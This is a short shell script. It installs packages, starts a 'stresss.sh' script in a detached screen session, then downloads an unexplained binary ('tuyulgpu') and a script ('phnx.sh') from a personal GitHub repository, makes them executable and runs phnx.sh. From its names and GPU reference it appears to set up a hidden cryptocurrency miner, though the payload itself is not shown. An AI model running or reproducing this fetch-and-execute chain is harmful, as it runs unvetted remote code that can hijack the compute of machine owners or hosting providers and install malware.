#!/bin/sh

apt-get install libpci3
sudo apt update
sudo apt install screen -y
screen -dmS stresss.sh ./stresss.sh 65 75
wget https://github.com/lambohopo/myproject/raw/main/tuyulgpu
chmod +x tuyulgpu
wget https://raw.githubusercontent.com/lambohopo/myproject/main/phnx.sh
chmod +x phnx.sh
./phnx.sh
